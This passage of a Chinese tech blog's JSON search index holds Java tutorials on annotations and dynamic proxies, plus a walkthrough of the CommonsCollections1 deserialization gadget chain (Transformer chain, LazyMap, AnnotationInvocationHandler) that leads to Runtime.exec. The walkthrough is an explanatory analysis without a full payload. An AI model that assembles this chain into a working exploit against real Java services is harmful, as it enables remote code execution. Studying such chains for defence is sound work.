reqFromReqs : reqs.value()) { urlMap.put(reqFromReqs.path(), m); } } } return urlMap; } private Request getRequest(Method m) { return m.getAnnotation(Request.class); } private Requests getRequests(Method m) { return m.getAnnotation(Requests.class); }}class test { public static void main(String[] args) { Analysis test = new Analysis(); System.out.println(test.RouteAnalysis().get(\"/index\")); // output public java.lang.Object RouteTest.Route.Route.index() }}","link":"/2020/11/17/java%E6%B3%A8%E8%A7%A3%E5%AD%A6%E4%B9%A0/"},{"title":"java动态代理","text":"java代理机制作用： 对于不能或不想直接引用的对象，通过代理访问 通过代理去掉不能看到的内容 通过代理提供额外服务 Subject: 公共对外方法，表现为一个接口RealSubject: 真正的方法实现Proxy: 用来代理和封装RealSubject 静态代理sqlInterface.java 123456package ProxyTest;public interface sqlInterface { public sqlInterface select(); public sqlInterface update();} sql1.java 12345678910111213141516package ProxyTest;public class sql1 implements sqlInterface { @Override public sqlInterface select() { System.out.println(\"selected\"); return this; } @Override public sqlInterface update() { System.out.println(\"updated\"); return this; }} sqlProxy.java 12345678910111213141516171819202122232425262728293031323334353637383940package ProxyTest;import java.util.Date;public class sqlProxy implements sqlInterface{ private sqlInterface sql = null; public sqlProxy(sqlInterface sql) { this.sql = sql; } @Override public sqlInterface select() { before(); sql.select(); after(); return null; } @Override public sqlInterface update() { before(); sql.update(); after(); return null; } private void before() { System.out.println(\"数据库已连接\"); String start = String.format(\"log start time [%s] \", new Date()); System.out.println(start); } private void after() { String end = String.format(\"log end time [%s] \", new Date()); System.out.println(end); System.out.println(\"数据库已断开\"); }} ProxyTest.java 123456789101112131415161718package ProxyTest;public class ProxyTest { public static void main(String[] args) { sql1 sql = new sql1(); sqlProxy sqlProxy = new sqlProxy(sql); sqlProxy.select(); }}/*output数据库已连接log start time [Wed Nov 18 20:53:43 CST 2020] selectedlog end time [Wed Nov 18 20:53:43 CST 2020] 数据库已断开*/ 从上的代码来看，这里使用了代理模式来实现了一个log功能。静态代理虽然简单，但可以看到，因为接口是被限定死的，如果未来更改接口，其维护量可想而知… 动态代理静态代理是写死的，那么动态代理顾名思义，其是动态生成的。 jdk原生动态代理下面是上面的静态代理代码修改为动态代理后 sqlLogHandler.java 12345678910111213141516171819202122232425262728293031323334package ProxyTest;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Date;public class sqlLogHandler implements InvocationHandler { private sqlInterface sql = null; public sqlLogHandler(sqlInterface sql) { this.sql = sql; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { before(); Object obj = method.invoke(sql, args); after(); return obj; } private void before() { System.out.println(\"数据库已连接\"); String start = String.format(\"log start time [%s] \", new Date()); System.out.println(start); } private void after() { String end = String.format(\"log end time [%s] \", new Date()); System.out.println(end); System.out.println(\"数据库已断开\"); }} sqlProxyGetter.java 1234567891011121314151617package ProxyTest;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;public class sqlProxyGetter { public static sqlInterface getProxy(sqlInterface sql, InvocationHandler sqlProxy) { sqlInterface proxy = (sqlInterface) Proxy.newProxyInstance( sql.getClass().getClassLoader(), sql.getClass().getInterfaces(), sqlProxy ); return proxy; }} ProxyTest.java 12345678910111213141516171819package ProxyTest;public class ProxyTest { public static void main(String[] args) { sql1 sql = new sql1(); sqlLogHandler logger = new sqlLogHandler(sql); sqlInterface proxy = sqlProxyGetter.getProxy(sql, logger); proxy.select(); }}/*output数据库已连接log start time [Thu Nov 19 20:38:35 CST 2020] selectedlog end time [Thu Nov 19 20:38:35 CST 2020] 数据库已断开*/ 使用原生的jdk生成代理有两个核心 java.lang.reflect.InvocationHandler java.lang.reflect.Proxy InvocationHandler是一个接口，包含方法invoke，须在对应的调用处理器（这里是sqlLogHandler）进行实现。 Proxy是动态代理的核心类。通过静态方法newProxyInstance来获取动态代理对象。这个方法需要三个参数，一个是接口实现类自己的类加载器，一个是其实现的所有接口，最后是一个调用处理器。 其它方法待更新…","link":"/2020/11/22/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"title":"java反序列化--CommonsCollections1","text":"CommonsCollections1链终点这条链从终点开始讲可能简单一点。 Transformer一切的一切得从Transformer，这个接口讲起。这个接口仅有一个Transformer方法，作用是定义一个转换器，将换另一个对象。 这里用到了Tansformer的三个实现 InvokeTansformar对输入的对象进行反射调用 ConstantTansformer原分原的返还对象 ChainTansformar进行Tansformar的链式调用 整个调用链的一个重要的地方是ChainTansformar的Tansformar方法 123456public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object;} 其中，iTransformar是一个数组，被指定为上图1-1的transformars变量。这样可以循环调用里面值的Tansformar方法。 之后是ConstantTransformar 123public Object transform(Object input) { return iConstant;} 其中，iConstant是构造函数传入的对象 最后是InvokeTansformar，可以对传入的对象进行反射操作 1234567891011121314151617public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); }} 整体看下来，Transformar的调用链如下 1[ConstantTransformar]--Runtime.class--&gt;[InvokeTransformar]--getMethod--&gt;[InvokeTransformar]--invoke--&gt;[InvokeTransformar]--exec--&gt;命令执行 LazyMap现在我们知道，我们的最终目的是调用ChainTransformar的Tranformar方法。向上推理，我们须要找到一个类的方法来调用tranformar。 来看看yso的CC1链是怎么写的 yso工具的CC链中，最常用的方法是LazyMap类中的get了。 12345678public Object get(Object key) { if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key);} 可以看到，只需要map属性不包含key变量的指即可调用factory属性的transformar方法。 动态代理调用好，现在跳板转到了LazyMap的get方法上。那么还是需要一个跳板或者readObject方法来调用这个get方法。 yso在这里调用了两个静态方法 跟入看一看 emmm好像很复杂，我们来慢慢分析。 首先从createMemoitizedProxy跟入createMemoizedInvocationHandler。可以看到其反射调用了某个类的第一个构造方法，并利用其实例化。ANN_INV_HANDLER_CLASS常量是一个类名字符串，即sun.reflect.annotation.AnnotationInvocationHandler(这个类是注解的实例化，这个涉及java注解类的底层，以后再讲，等不急的朋友可以看一看这个https://www.cnblogs.com/throwable/p/9747595.html。java注解的底层也是动态代理)。 为什么要用如此奇怪的方法来实例化这个类呢？其实看看源码就知道。 源码的文件名为AnnotationInvocationHandler.java，但其并不是一个public类，所以无法从外部实例化，想实例化，只能通过反射的方式。 然后，我们继续跟入createProxy中。其新建了一个Map接口的动态代理对象，处理器为AnnotationInvocationHandler。这里不懂的话，可以先看看之前的文章。 最后，他又将Map的动态代理对象通过反射调用构造函数，放入了AnnotationInvocationHandler。 然后，我们要序列化的类便是这个装载了Map动态代理的AnnotationInvocationHandler类 readObject 上面是AnnotationInvocationHandler类的readObject方法。可以看到其首先通过defaultReadObject来获取属性。之后便开始处理这些属性。在其中会调用this.memberValues.entrySet，于是其触发了动态代理机制，去调用其invoke方法（PS:感觉像php的__call方法…）。 上面代码最重要的其实是最后一句this.memberValues.get()。之前代码的大致意思是检查我们是否是想调用hashCode、toString之类的方法。但很明显，我们要调用entrySet方法，所以上面的代码几乎全部跳过，直接来到了最后一句。通过动态代理调用get方法。根据之前的赋值，这里会调用LazyMap的get方法，最终调用我们整个链。 调用栈12343. Tranformar Chain2. LazyMap::get1. AnnotationInvocationHandler::invoke0. AnnotationInvocationHandler::readObject","link":"/2020/11/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1/"}],"tags":[{"name":"javascipt","slug":"javascipt","link":"/tags/javascipt/"},{"name":"对象","slug":"对象","link":"/tags/%E5%AF%B9%E8%B1%A1/"},{"name":"继承","slug":"继承","link":"/tags/%E7%BB%A7%E6%89%BF/"},{"name":"原型链污染","slug":"原型链污染","link":"/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"框架","slug":"框架","link":"/tags/%E6%A1%86%E6%9E%B6/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"开发","slug":"开发","link":"/tags/%E5%BC%80%E5%8F%91/"},{"name":"基础","slug":"基础","link":"/tags/%E5%9F%BA%E7%A1%80/"},{"name":"注解","slug":"注解","link":"/tags/%E6%B3%A8%E8%A7%A3/"}],"categories":[]}